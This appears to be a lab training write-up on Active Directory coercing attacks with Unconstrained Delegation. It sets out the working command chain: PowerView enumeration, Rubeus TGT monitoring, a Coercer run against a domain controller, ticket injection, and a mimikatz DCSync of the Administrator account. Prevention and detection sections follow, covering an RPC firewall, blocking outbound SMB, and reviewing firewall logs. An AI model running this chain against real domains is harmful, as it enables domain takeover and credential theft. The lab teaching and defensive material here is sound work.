# 🔴 Coercing Attacks & Unconstrained Delegation

## 📖 Description

Coercing attacks have become a one-stop shop for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the PrinterBug. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce RemoteServer$ to authenticate to any machine in the domain. Eventually, the Coercer tool was developed to exploit all known vulnerable RPC functions simultaneously.

Similar to the PrinterBug, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:

* Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
* Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
* Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
* Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.

---

## 🔴 Attack

We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for Unconstrained Delegation. We will use this server to capture the TGT, while Coercer will be executed from the Kali machine.

To identify systems configured for Unconstrained Delegation, we can use the Get-NetComputer function from PowerView along with the -Unconstrained switch:

```powershell
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
```

<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/48e22b41-7132-42d2-8878-9101108b622f" />

WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
```

<img width="663" height="691" alt="image" src="https://github.com/user-attachments/assets/5ada1de6-52a1-4423-b7a6-2fbb0756decc" />

<img width="1356" height="951" alt="image" src="https://github.com/user-attachments/assets/d6923d89-992e-4826-b0bc-8e8763003e47" />

Next, we need to know the IP address of WS001, which we can be obtain by running ipconfig. Once known, we will switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful:

```shellsession
@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

<img width="676" height="737" alt="image" src="https://github.com/user-attachments/assets/c9303f3e-9a0e-4ec1-aa2a-dd5c990de329" />

<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/b6dd3231-4eae-4645-9468-0d105d00ea3a" />

Now, if we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:

<img width="646" height="553" alt="image" src="https://github.com/user-attachments/assets/f281ff56-fab0-48de-a94b-518c8a282165" />

<img width="1420" height="875" alt="image" src="https://github.com/user-attachments/assets/cbc3b9c0-27b9-46cd-947a-c4a1744e7668" />

We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).

One way of using the abovementioned TGT is through Rubeus, as follows.

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

<img width="624" height="618" alt="image" src="https://github.com/user-attachments/assets/5d0988bb-d5f1-4156-8319-20acf968b160" />

Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.

```powershell
PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"```

<img width="475" height="834" alt="image" src="https://github.com/user-attachments/assets/c19a330c-b8da-4fb3-8d7e-effe7c6fe9a7" />

---

## 🛡️ Prevention

Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:

* Implementing a third-party RPC firewall, such as the one from zero networks, and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous OPNUM associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
* Block Domain Controllers and other core infrastructure servers from connecting to outbound ports 139 and 445, except to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)

### 📌 Focused Defensive Measures

#### 🛡️ Limit Unconstrained Delegation

Regularly review systems configured for Unconstrained Delegation and remove it from systems where it is not required. Limiting the number of systems that can receive and cache TGTs reduces the available attack surface.

#### 🛡️ Protect Domain Controllers

Domain Controllers should have tightly restricted outbound network access. In particular, review and restrict unnecessary outbound SMB connections over ports 139 and 445 while preserving the connections required for legitimate Active Directory operations.

#### 🛡️ Reduce Privileged Access

Administrative access to systems configured for Unconstrained Delegation should be tightly controlled. Avoid using highly privileged accounts for routine administration on these systems where possible.

#### 🔎 Audit Delegation Configuration

Regularly audit Active Directory computer accounts for Unconstrained Delegation and investigate unexpected or newly introduced configurations.

---

## 🔎 Detection

As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from zero networks is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.

A successful coercing attack with Coercer will result in the following host firewall log, where the machine at .128 is the attacker machine and the .200 is the Domain Controller:

<img width="2419" height="1248" alt="image" src="https://github.com/user-attachments/assets/14790b8a-7971-41c7-95f6-1cd609058a77" />

We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.

If we go forward and block outbound traffic to port 445, then we will observe the following behavior:

<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/9398ac7a-51bd-459b-a74f-8305a46d752e" />

Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports 139 and 445 is recommended.

The above can also be used for detection, as any unexpected dropped traffic to ports 139 or 445 is suspicious.

---

## 🔑 Key Takeaway

**Coercing Attacks & Unconstrained Delegation** means an attacker can abuse vulnerable RPC functions to force a Domain Controller to authenticate to a machine that is trusted for Unconstrained Delegation. The resulting TGT can then be captured and reused for authentication.

The key security lesson is that **coercion becomes especially dangerous when combined with Unconstrained Delegation**, because a forced authentication can turn into reusable Kerberos credentials. Restricting delegation, protecting Domain Controllers, and monitoring unexpected SMB traffic can help reduce this attack path.
